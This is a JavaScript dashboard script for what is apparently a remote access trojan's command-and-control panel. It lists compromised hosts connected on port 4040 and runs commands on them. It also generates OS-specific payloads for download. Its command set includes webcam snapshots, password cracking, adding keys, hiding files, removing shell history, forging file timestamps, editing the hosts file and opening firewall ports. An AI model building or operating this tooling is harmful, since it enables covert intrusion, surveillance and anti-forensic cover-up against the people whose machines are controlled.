const socket = io();
let selectedConnection = null;
let autoScroll = true;

socket.on('connect', () => {
    console.log('WebSocket connected');
    updateConnectionStatus(true);
    loadInitialData();
});

socket.on('disconnect', () => {
    console.log('WebSocket disconnected');
    updateConnectionStatus(false);
});

socket.on('debug_log', (data) => {
    addDebugLog(data);
});

socket.on('pong', (data) => {
    console.log('Pong received:', data);
});

function updateConnectionStatus(connected) {
    const statusDot = document.getElementById('serverStatus');
    const statusText = document.getElementById('statusText');
    
    if (connected) {
        statusDot.classList.add('connected');
        statusText.textContent = 'Connected';
    } else {
        statusDot.classList.remove('connected');
        statusText.textContent = 'Disconnected';
    }
}

function loadInitialData() {
    loadConnections();
    loadFiles();
    loadDebugLogs();
    
    setInterval(() => {
        if (document.getElementById('connections-section').classList.contains('active')) {
            loadConnections();
        }
        if (document.getElementById('files-section').classList.contains('active')) {
            loadFiles();
        }
    }, 5000);
}

async function loadConnections() {
    try {
        const response = await fetch('/api/connections');
        const connections = await response.json();
        
        const grid = document.getElementById('connectionsGrid');
        const selector = document.getElementById('commandConnection');
        
        if (connections.length === 0) {
            grid.innerHTML = `
                <div class="empty-state">
                    <p>🔍 No active connections</p>
                    <p class="help-text">Connections will appear here when devices connect to port 4040</p>
                </div>
            `;
            selector.innerHTML = '<option value="">No connections available</option>';
        } else {
            grid.innerHTML = connections.map(conn => `
                <div class="connection-card">
                    <h3>${conn.hostname || 'Unknown'}</h3>
                    <div class="connection-info">
                        <p><strong>IP:</strong> ${conn.target}</p>
                        <p><strong>User:</strong> ${conn.user}</p>
                        <p><strong>OS:</strong> ${conn.os}</p>
                        <p><strong>Port:</strong> ${conn.port}</p>
                        <p><strong>Connected:</strong> ${new Date(conn.connected_at).toLocaleString()}</p>
                    </div>
                </div>
            `).join('');
            
            selector.innerHTML = connections.map(conn => 
                `<option value="${conn.id}">${conn.hostname} (${conn.target})</option>`
            ).join('');
        }
    } catch (error) {
        console.error('Error loading connections:', error);
    }
}

function showToast(message, type = 'info') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.style.animation = 'slideIn 0.3s ease reverse';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

async function executeCommand(command, args = '') {
    const connId = document.getElementById('commandConnection').value;
    if (!connId) {
        addCommandOutput('❌ Please select a connection first', 'error');
        showToast('Please select a connection', 'warning');
        return;
    }
    
    const fullCommand = args ? `${command} ${args}` : command;
    addCommandOutput(`> ${fullCommand}`, 'command');
    addCommandOutput('⏳ Executing... <span class="loading-spinner"></span>', 'info');
    
    try {
        const response = await fetch('/api/execute', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                connection_id: connId,
                command: fullCommand
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            addCommandOutput(result.output || 'Command executed successfully', 'success');
            showToast('Command executed', 'success');
        } else {
            addCommandOutput(`❌ ${result.error}`, 'error');
            showToast('Command failed', 'error');
        }
    } catch (error) {
        addCommandOutput(`❌ Error: ${error.message}`, 'error');
        showToast('Network error', 'error');
    }
}

function addCommandOutput(text, type = 'normal') {
    const output = document.getElementById('commandOutput');
    const timestamp = new Date().toLocaleTimeString();
    
    let prefix = '';
    let cssClass = 'output-normal';
    if (type === 'command') {
        prefix = '$ ';
        cssClass = 'output-command';
    }
    if (type === 'error') {
        prefix = '❌ ';
        cssClass = 'output-error';
    }
    if (type === 'success') {
        prefix = '✅ ';
        cssClass = 'output-success';
    }
    if (type === 'info') {
        prefix = '';
        cssClass = 'output-info';
    }
    
    const line = document.createElement('div');
    line.className = cssClass;
    line.innerHTML = `[${timestamp}] ${prefix}${text}`;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

async function generatePayload() {
    const osType = document.getElementById('osType').value;
    const host = document.getElementById('payloadHost').value;
    const port = document.getElementById('payloadPort').value;
    
    if (!host || !port) {
        alert('Please fill in all fields');
        return;
    }
    
    addCommandOutput(`Generating ${osType} payload...`, 'info');
    
    try {
        const response = await fetch('/api/payload/generate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ os_type: osType, host, port })
        });
        
        const result = await response.json();
        
        if (result.success) {
            addCommandOutput(`✅ ${result.message}`, 'success');
            addPayloadToList(result.payload_name, osType, result.download_url);
        } else {
            addCommandOutput(`❌ ${result.error}`, 'error');
        }
    } catch (error) {
        addCommandOutput(`❌ Error: ${error.message}`, 'error');
    }
}

function addPayloadToList(name, os, downloadUrl) {
    const list = document.getElementById('payloadsList');
    
    if (list.querySelector('.empty-state')) {
        list.innerHTML = '';
    }
    
    const item = document.createElement('div');
    item.className = 'payload-item';
    item.innerHTML = `
        <div>
            <strong>${name}</strong>
            <p class="help-text">OS: ${os}</p>
        </div>
        <button class="btn btn-primary btn-sm" onclick="window.open('${downloadUrl}', '_blank')">
            Download
        </button>
    `;
    list.prepend(item);
}

async function loadFiles() {
    try {
        const response = await fetch('/api/files/downloads');
        const files = await response.json();
        
        const tbody = document.getElementById('filesList');
        
        if (files.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No files available</td></tr>';
        } else {
            tbody.innerHTML = files.map(file => `
                <tr>
                    <td>${file.name}</td>
                    <td>${formatBytes(file.size)}</td>
                    <td>${new Date(file.modified).toLocaleString()}</td>
                    <td>
                        <a href="/api/files/download/${file.name}" class="btn btn-primary btn-sm">Download</a>
                    </td>
                </tr>
            `).join('');
        }
    } catch (error) {
        console.error('Error loading files:', error);
    }
}

async function loadDebugLogs() {
    try {
        const response = await fetch('/api/debug/logs');
        const logs = await response.json();
        
        const output = document.getElementById('logsOutput');
        output.innerHTML = logs.map(log => `
            <div class="log-entry log-${log.level.toLowerCase()}">
                <span class="log-time">${log.timestamp}</span>
                <span class="log-level">${log.level}</span>
                <span class="log-message">${log.message}</span>
            </div>
        `).join('');
        
        if (autoScroll) {
            output.scrollTop = output.scrollHeight;
        }
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

function addDebugLog(log) {
    const output = document.getElementById('logsOutput');
    const entry = document.createElement('div');
    entry.className = `log-entry log-${log.level.toLowerCase()}`;
    entry.innerHTML = `
        <span class="log-time">${log.timestamp}</span>
        <span class="log-level">${log.level}</span>
        <span class="log-message">${log.message}</span>
    `;
    output.appendChild(entry);
    
    if (autoScroll) {
        output.scrollTop = output.scrollHeight;
    }
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

document.addEventListener('DOMContentLoaded', () => {
    const navLinks = document.querySelectorAll('.nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            
            navLinks.forEach(l => l.classList.remove('active'));
            link.classList.add('active');
            
            const section = link.dataset.section;
            document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
            document.getElementById(`${section}-section`).classList.add('active');
        });
    });
    
    const catBtns = document.querySelectorAll('.cat-btn');
    catBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            catBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            
            const category = btn.dataset.category;
            document.querySelectorAll('.command-group').forEach(g => g.style.display = 'none');
            document.getElementById(`${category}Commands`).style.display = 'block';
        });
    });
    
    const cmdBtns = document.querySelectorAll('.cmd-btn');
    cmdBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const cmd = btn.dataset.cmd;
            const help = btn.dataset.help;
            
            // Commands requiring file path or single parameter
            const requiresPath = [
                'download', 'upload', 'cat', 'more', 'touch', 'fileinfo', 
                'hide', 'unhide', 'editaccessed', 'editcreated', 'editmodified', 
                'cd', 'run', 'pyexec', 'sudo', 'shell', 'history_remove', 
                'addkey', 'webcamsnap', 'crackpassword'
            ];
            
            // Commands requiring text input
            const requiresInput = [
                'popup', 'logintext', 'hostsfile remove'
            ];
            
            // Commands requiring multiple inputs (special handling)
            const requiresMultiple = {
                'listen': ['Port (default 4040)'],
                'connect': ['Target IP', 'Port'],
                'hostsfile update': ['Hostname', 'IP Address'],
                'firewall open': ['Port', 'Direction (in/out)', 'Protocol (tcp/udp)'],
                'firewall close': ['Port', 'Direction (in/out)', 'Protocol (tcp/udp)'],
                'ssh': ['Username', 'Host', 'Password (optional)']
            };
            
            if (requiresMultiple[cmd]) {
                const inputs = [];
                for (const field of requiresMultiple[cmd]) {
                    const val = prompt(`Enter ${field}:`);
                    if (val === null) return; // User cancelled
                    inputs.push(val);
                }
                executeCommand(cmd, inputs.filter(v => v).join(' '));
            } else if (requiresPath.includes(cmd) || cmd.includes('edit')) {
                const path = prompt(`Enter file path or parameter for ${cmd}:`);
                if (path) {
                    executeCommand(cmd, path);
                }
            } else if (requiresInput.includes(cmd)) {
                const input = prompt(`Enter input for ${cmd}:`);
                if (input) {
                    executeCommand(cmd, input);
                }
            } else {
                executeCommand(cmd);
            }
        });
        
        btn.title = btn.dataset.help;
    });
    
    document.getElementById('executeCustom')?.addEventListener('click', () => {
        const cmd = document.getElementById('customCommand').value;
        if (cmd) {
            executeCommand(cmd);
            document.getElementById('customCommand').value = '';
        }
    });
    
    document.getElementById('customCommand')?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            document.getElementById('executeCustom').click();
        }
    });
    
    document.getElementById('clearOutput')?.addEventListener('click', () => {
        document.getElementById('commandOutput').textContent = 'Ready to execute commands...';
    });
    
    document.getElementById('generatePayload')?.addEventListener('click', generatePayload);
    
    document.getElementById('refreshFiles')?.addEventListener('click', loadFiles);
    
    document.getElementById('clearLogs')?.addEventListener('click', () => {
        document.getElementById('logsOutput').innerHTML = '';
    });
    
    document.getElementById('autoScroll')?.addEventListener('change', (e) => {
        autoScroll = e.target.checked;
    });
    
    catBtns[0]?.click();
    
    setInterval(() => {
        socket.emit('ping');
    }, 30000);
});
